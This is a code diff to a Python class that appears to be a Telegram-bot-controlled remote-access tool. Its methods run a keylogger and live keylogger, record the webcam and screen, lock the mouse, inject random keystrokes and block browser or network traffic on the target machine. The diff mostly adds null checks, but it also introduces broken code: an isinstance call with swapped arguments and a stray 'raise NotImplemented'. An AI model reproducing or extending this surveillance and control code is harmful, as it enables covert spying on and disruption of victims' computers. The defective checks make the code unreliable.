@@ -638,20 +638,24 @@ class PeppinoTelegram:
     
     @requires_admin
     def block_chrome(self, timeout: int) -> None:
+        raise NotImplemented
         print(f"Blocking chrome for {timeout} seconds")
         loading_bar = self.new_loading_bar_timed_worker("Blocking Chrome", timeout, block_chrome, (timeout,))
+        if not loading_bar: return
         loading_bar.start()
 
     @requires_admin
     def block_port(self, port: int, timeout: int) -> None:
         print(f"Blocking port {port} for {timeout} seconds")
         loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, args=(port, timeout))
+        if not loading_bar: return
         loading_bar.start()
 
     @requires_admin
     def block_http(self, timeout: int) -> None:
         print(f"Blocking HTTP for {timeout} seconds")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, args=(timeout,))
+        if not loading_bar: return
         loading_bar.start()
 
     @requires_admin
@@ -667,6 +671,7 @@ class PeppinoTelegram:
 
         print(f"Blocking HTTPS for {timeout} seconds")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, args=(timeout,))
+        if not loading_bar: return
         loading_bar.start()
 
     def breath(self) -> None:
@@ -1209,6 +1214,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             label="Keylogger",
             showperc=True,
         )
+        if not loading: return
 
         start_time = monotonic()
 
@@ -1304,6 +1310,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Starting live keylogger for {timeout} seconds")
         start = monotonic()
         bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
+        if not bar: return
         state = {"value":"📡 Live Keylogger Output: ",
                   "running":True}
         buffer_message = self.new_editable_message(state["value"])
@@ -1429,6 +1436,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def mouselock(self, timer: int=6) -> None:
         print(f"Locking mouse for {timer} seconds")
         bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
+        if not bar: return
         start = monotonic()
         pos = pg.position()
         time_elapsed = 0
@@ -1572,14 +1580,28 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.all_session_messages.append(editable.message_id)
         return editable
 
-    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
+    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar|None:
         print(f"Creating loading bar: {label}, total={total}")
+        if isinstance(str, total):
+            if total.replace(".","").isdigit():
+                total = float(total)
+            else:
+                self.operation_canceled("Loading bar was passed a total that was not a valid number")
+                print(f"[LoadingBar] total was not a number, it was: '{total}'")
+                return None
         loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10, cancel_button=True) 
         self.bars.update({id(loadingbar):loadingbar})
         return loadingbar
 
     def new_loading_bar_timed_worker(self, label: str, duration: int, target: Callable, args: tuple=(), on_cancel: Callable|None=None, block_default_cancel: bool=False) -> LoadingBarTimedWorker:
         print(f"Creating loading bar worker: {label}, duration={duration}")
+        if isinstance(str, duration):
+            if duration.replace(".","").isdigit():
+                duration = float(duration)
+            else:
+                self.operation_canceled("LoadingBarTimedWorker was passed a total that was not a valid number")
+                print(f"[LoadingBarTimedWorker] duration was not an float, it was: '{duration}'")
+                return None
         loadingbar_tw = LoadingBarTimedWorker(label=label,duration=duration, chat_id=self.owner_id, bot=self.bot, target=target, args=args, loading_bar_kwargs={
             "full_char":self.loading_bar_set[0],
             "empty_char":self.loading_bar_set[1],
@@ -1608,9 +1630,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if not self.cap.isOpened():
             self.cap.open(0)
 
-    def operation_canceled(self, info: str|None=None) -> None:
+    def operation_canceled(self, info: str | None = None) -> None:
         print(f"Operation cancelled: {info=}")
-        self.bsendWithMarkdownV2(f"🚫 *Operation cancelled*{f'\n_{info}\\._' if info else ''}")
+        message = "🚫 *Operation cancelled*"
+        if info:
+            message += f"\n_{info}\\._"
+        self.bsendWithMarkdownV2(message)
 
     def parse_audio(self, msg: dict) -> None:
         print("Parsing audio message")
@@ -1800,6 +1825,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                                           target=self.overlay_tk.video_note_overlay,
                                           args=(saved_filepath, posx[pos_idx]),
                                           on_cancel=self.overlay_tk._safe_destroy, block_default_cancel=True)
+        if not bar: return
         bar.start()
         #self.overlay_tk.video_note_overlay(saved_filepath, posx[pos_idx])
 
@@ -1983,6 +2009,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Playing random noise for {duration} seconds")
         start = monotonic()
         loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
+        if not loading_bar: return
         thread = Thread(target=self.audio_player.play_random_noise, args=(duration,))
         thread.start()
         while (monotonic()-start) < duration:
@@ -2019,6 +2046,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Random keyboard input for {timeout} seconds")
         start = monotonic()
         loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
+        if not loading_bar: return
         while (monotonic()-start)<timeout:
             loading_bar.update(monotonic()-start)
             if loading_bar.canceled:
@@ -2064,6 +2092,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Recording screen for {duration} seconds")
         duration = int(duration)
         bar = self.new_loading_bar(duration, label=f"{emoji_dict['screen']} Recording Screen")
+        if not bar: return
         try:
             filename = join(f"{BURN_DIRECTORY}", f"{randomname()}.mp4")
             audio_filename = join(f"{BURN_DIRECTORY}",f"{randomname()}.wav")
@@ -2114,6 +2143,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         try:
             duration = int(duration)
             bar = self.new_loading_bar(duration, label="Recording Webcam", showperc=True)
+            if not bar: return
 
             filename = join(BURN_DIRECTORY, f"{randomname()}.mp4")
             audio_file = join(BURN_DIRECTORY, f"{randomname()}.wav")
@@ -2178,6 +2208,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print(f"Recording webcam and screen for {capture_duration} seconds")
         capture_duration = int(capture_duration)
         bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
+        if not bar: return
         try:
             filename = join(BURN_DIRECTORY, randomname()+".mp4")
             audio_filename = join(BURN_DIRECTORY, randomname()+".wav")
@@ -2350,6 +2381,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return
         seconds = int(seconds)
         loading_bar = self.new_loading_bar(label=f"{emoji_dict['camera']}{emoji_dict['screen']} Set Camera As Wallpaper", total=seconds, showperc=True)
+        if not loading_bar: return
         filename = join(BURN_DIRECTORY, "jxframe.png")
         start = monotonic()
         res = True
@@ -2753,6 +2785,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                                                 target=self.overlay_opencv.run_disturbance_effect,
                                                 args=(timeout_seconds, ),
                                                 on_cancel=custom_oncancel)
+        if not bar: return
         bar.start()
 
     def disturbed_overlay_and_random_noise(self, duration: int) -> None:
